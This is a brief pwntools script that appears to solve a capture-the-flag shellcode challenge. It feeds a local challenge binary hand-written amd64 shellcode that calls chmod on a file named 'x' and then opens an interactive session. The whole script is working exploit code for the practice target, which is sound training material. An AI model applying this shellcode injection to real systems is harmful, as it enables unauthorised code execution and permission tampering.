from pwn import *

context.arch = 'amd64'
context.os = 'linux'

p = process("/challenge/shellcode")

asm_code = asm ("""
        mov eax, 90
        lea rdi, [rip + flag]
        syscall
        flag:
        .string "x"
        """)

# print(len(asm_code))

p.recvuntil("shellcode: ")
p.sendline(asm_code)
p.interactive()
